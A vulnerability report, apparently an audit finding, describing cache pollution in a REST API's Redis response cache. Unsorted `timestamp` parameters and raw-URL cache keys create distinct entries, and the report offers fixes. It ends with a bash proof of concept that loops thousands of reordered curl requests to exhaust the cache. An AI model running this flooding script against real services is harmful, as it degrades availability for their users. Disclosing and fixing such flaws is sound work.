### Title
Cache Key Uses Raw URL Instead of Normalized URL, Enabling Cache Pollution via `timestamp` Parameter Ordering

### Summary
`cacheKeyGenerator` in `rest/middleware/responseCacheHandler.js` hashes `req.originalUrl` directly rather than the output of `normalizeRequestQueryParams()`. Because `timestamp` is in `NON_SORTED_PARAMS` and is therefore never sorted by the normalizer, an unprivileged attacker can send requests with different orderings of `timestamp` values to the same logical endpoint, each producing a distinct Redis cache key and a distinct cache entry. This allows cache capacity exhaustion and eviction of legitimate entries.

### Finding Description
**Code path 1 — cache key generation** (`rest/middleware/responseCacheHandler.js`, lines 151–153):
```js
const cacheKeyGenerator = (req) => {
  return crypto.createHash('md5').update(req.originalUrl).digest('hex') + CACHE_KEY_VERSION_SUFFIX;
};
```
The key is derived from the raw, un-normalized `req.originalUrl`. The inline comment at line 149 acknowledges this is a known gap: *"In the future, this will utilize Edwin's request normalizer (9113)."*

**Code path 2 — `timestamp` is intentionally not sorted** (`rest/middleware/requestNormalizer.js`, lines 23 and 70–72):
```js
const NON_SORTED_PARAMS = COLLAPSABLE_PARAMS.concat([filterKeys.BLOCK_NUMBER, filterKeys.TIMESTAMP]);
...
if (!NON_SORTED_PARAMS.includes(name)) {
    valueArray.sort();   // timestamp never reaches this branch
}
```
`timestamp` is excluded from sorting because query-result semantics depend on ordering. This is intentional for SQL correctness, but it means that even if the normalizer were wired into `cacheKeyGenerator` in the future, `timestamp` ordering would still not be canonicalized.

**Combined effect**: Two requests that are semantically identical to the database—
```
GET /api/v1/transactions?timestamp=gte:1000000000.000000000&timestamp=lt:2000000000.000000000
GET /api/v1/transactions?timestamp=lt:2000000000.000000000&timestamp=gte:1000000000.000000000
```
—produce two different MD5 hashes and therefore two separate Redis entries, each consuming memory and TTL slots.

**Exploit flow**:
1. Attacker enumerates a valid endpoint that accepts multiple `timestamp` values (e.g., `/api/v1/transactions`, `/api/v1/contracts/results/logs`).
2. With `maxRepeatedQueryParameters = 100`, up to 100 `timestamp` values can be supplied per request.
3. For N timestamp values there are N! possible orderings; even with 3–4 values this is 6–24 distinct cache keys per logical query.
4. Attacker sends a high volume of requests cycling through orderings, each causing a cache miss → DB hit → new Redis entry.
5. Redis fills to `maxMemory` (default 250 MB); `allkeys-lfu` eviction begins, preferentially evicting infrequently-accessed entries—i.e., legitimate but less-popular queries.

**Why existing checks are insufficient**:
- `maxRepeatedQueryParameters = 100` limits repetitions per request but does not prevent many distinct requests.
- `allkeys-lfu` eviction protects the most popular entries but does not prevent cache pollution or DB load amplification.
- There is no rate limiting in the REST API middleware layer (the `ThrottleConfiguration`/`ThrottleManagerImpl` found in the codebase belongs to the `web3` module, not the REST API).
- The response cache is **disabled by default** (`cache.response.enabled: false`), but when enabled there is no guard.

### Impact Explanation
When the Redis response cache is enabled, an attacker can continuously insert junk entries, forcing eviction of cached responses for legitimate users and causing every evicted request to fall through to the database. This amplifies DB load proportionally to the attack rate, degrading service for all users. No data is corrupted and no funds are at risk; the impact is availability degradation (griefing).

### Likelihood Explanation
The attack requires no credentials, no special knowledge beyond the public OpenAPI spec, and is trivially scriptable. The only precondition is that the operator has enabled `cache.response.enabled = true` and Redis. The attack is repeatable and stateless—the attacker does not need to maintain any session.

### Recommendation
1. **Immediate**: Wire `normalizeRequestQueryParams()` into `cacheKeyGenerator` so the cache key is derived from the canonical, normalized URL rather than `req.originalUrl`. The comment at line 149 of `responseCacheHandler.js` already tracks this as issue 9113.
2. **For `timestamp` specifically**: Since `timestamp` ordering is semantically significant for SQL but not for cache identity (the same set of timestamp constraints returns the same rows regardless of wire order), introduce a separate canonicalization step for cache-key purposes only that sorts `timestamp` values before hashing—without changing the order passed to the SQL layer.
3. **Defense-in-depth**: Add per-IP or per-endpoint rate limiting in the REST API middleware to bound the rate at which new cache entries can be created.

### Proof of Concept
```bash
# Assuming cache.response.enabled=true and Redis is running
BASE="http://localhost:5551/api/v1/transactions"

# Two semantically identical requests, different timestamp orderings
curl "$BASE?timestamp=gte:1000000000.000000000&timestamp=lt:2000000000.000000000"
curl "$BASE?timestamp=lt:2000000000.000000000&timestamp=gte:1000000000.000000000"

# Observe two distinct Redis keys (different MD5 hashes of originalUrl)
# Scale with a loop to exhaust cache:
for i in $(seq 1 10000); do
  T1="timestamp=gte:${i}000000000.000000000"
  T2="timestamp=lt:$((i+1))000000000.000000000"
  curl -s "$BASE?$T1&$T2" &
  curl -s "$BASE?$T2&$T1" &
done
wait
# Redis memory fills; legitimate cached entries are evicted under allkeys-lfu
``` [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** rest/middleware/responseCacheHandler.js (L141-153)
```javascript
/*
 * Generate the cache key to access Redis. While Accept-Encoding is specified in the API response Vary
 * header, and therefore that request header value should be used as part of the cache key, the cache
 * implementation stores the response body as the original JSON object without any encoding applied. Thus it
 * is the same regardless of the accept encoding specified, and chosen by the compression middleware.
 *
 * Current key format:
 *
 *   path?query - In the future, this will utilize Edwin's request normalizer (9113).
 */
const cacheKeyGenerator = (req) => {
  return crypto.createHash('md5').update(req.originalUrl).digest('hex') + CACHE_KEY_VERSION_SUFFIX;
};
```

**File:** rest/middleware/requestNormalizer.js (L23-23)
```javascript
const NON_SORTED_PARAMS = COLLAPSABLE_PARAMS.concat([filterKeys.BLOCK_NUMBER, filterKeys.TIMESTAMP]);
```

**File:** rest/middleware/requestNormalizer.js (L65-78)
```javascript
const getNormalizedArrayValue = (name, valueArray) => {
  if (isEmpty(valueArray)) {
    return;
  }

  if (!NON_SORTED_PARAMS.includes(name)) {
    // Sort the order of the parameters within the array
    valueArray.sort();
  } else if (COLLAPSABLE_PARAMS.includes(name)) {
    // Only add the last item in the array to the query parameter
    valueArray = valueArray.slice(valueArray.length - 1);
  }

  return valueArray.join('&' + name + '=');
```
